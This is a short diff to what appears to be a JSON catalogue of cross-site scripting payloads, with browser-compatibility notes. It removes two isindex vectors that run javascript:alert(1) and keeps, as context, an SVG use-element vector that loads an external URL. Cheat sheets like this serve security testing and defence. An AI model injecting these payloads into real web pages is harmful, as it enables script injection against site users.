@@ -194,20 +194,6 @@
         ]
     },
     {
-        "description": "Isindex and formaction",
-        "code": "<isindex type=submit formaction=javascript:alert(1)>",
-        "browsers": [
-            "edge"
-        ]
-    },
-    {
-        "description": "Isindex and action",
-        "code": "<isindex type=submit action=javascript:alert(1)>",
-        "browsers": [
-            "edge"
-        ]
-    },
-    {
         "description": "Use element with an external URL",
         "code": "<svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>",
         "browsers": [
